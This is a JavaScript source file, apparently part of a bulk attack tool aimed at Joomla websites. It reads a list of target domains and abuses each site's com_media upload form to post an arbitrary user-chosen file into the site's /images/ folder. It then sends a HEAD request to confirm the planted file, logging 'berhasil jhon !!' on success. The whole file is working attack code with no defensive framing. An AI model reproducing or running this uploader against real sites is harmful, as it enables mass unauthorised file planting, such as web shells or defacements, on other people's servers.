
function loadtargetc() {
    // body...
    var select = document.getElementById("targetlistc");

    var input = document.getElementById("loadtargetc");
    input.click();

    input.addEventListener("change", function() {

    	var file = input.files[0];


    	var reader = new FileReader();


    	reader.readAsText(file);


    	reader.onload = function() {

    		var text = reader.result;

    		const lines = text.split('\n');
    		console.log(lines)
    		select.innerHTML = "";
    		for (var i = 0; i < lines.length; i++) {
        // Create a new option element
        var option = document.createElement("option");

        // Set the value and text of the option
        option.value = lines[i];
        option.text = lines[i];

        // Add the option to the select element
        select.appendChild(option);
    }

};
});
}

function loadfilemedia() {
	var input = document.getElementById("upload-file");
	input.click();
}

function adddomainc() {
	var x = document.getElementById("targetlistc");
	var option = document.createElement("option");


	let text;
	let domain = prompt("Input domain:", "example.com");

	option.text = domain;
	x.add(option);
}



function com_media() {

	var select = document.getElementById("targetlistc");

	var kosong = document.getElementById("kosong");
	var berhasil = document.getElementById("berhasil");
	var result = document.getElementById("resultc");
	var length = select.options.length;

	result.value = ""

	if (length < 1) {
		kosong.style.display = "grid";
		beep(250);
	}else{
		for (var i = length-1; i >= 0; i--) {
			var option = select.options[i];
			kirimForm(option.value)
			console.log(option.value);
			select.remove(i);
		}

		berhasil.style.display = "grid";
		beep(800);
	}

}


function kirimForm(url) {
	fetch(addProtocol(url)+'/index.php?option=com_media&view=images&tmpl=component&fieldid=params_logoFile&e_name=&asset=com_config&author=created_by&folder=')
	.then(response => response.text())
	.then(html => {
		var parser = new DOMParser();
		var htmlDoc = parser.parseFromString(html, 'text/html');
		var targetElement = htmlDoc.getElementById('uploadForm');
		var targetElementHtml = targetElement.action;
		var formna = document.getElementById('formna');
		formna.action = targetElementHtml;
		submitform(url);

	});
}

function submitform(url) {
	var form = document.getElementById("formna");
	var action = form.action;
	var method = form.method;
	var data = new FormData(form);
	var result = document.getElementById("resultc");
	var xhr = new XMLHttpRequest();
	xhr.open(method, action, true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
			var filena = document.getElementById("upload-file");
			result.value += "check: "+addProtocol(url)+"/images/"+filena.files[0].name+"\n";
			cekfile(url);
		}
	};
	xhr.send(data);
}

function cekfile(url) {
	var filena = document.getElementById("upload-file");
	var result = document.getElementById("resultc");
	
	var url = addProtocol(url)+"/images/"+filena.files[0].name;
	var xhr = new XMLHttpRequest();
	xhr.open("HEAD", url, true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState === XMLHttpRequest.DONE) {
			if (xhr.status === 200) {
				result.value += "berhasil jhon !! \n"
			} else {
				result.value += "gagal !! \n"
			}
		}
	};
	xhr.send();

}
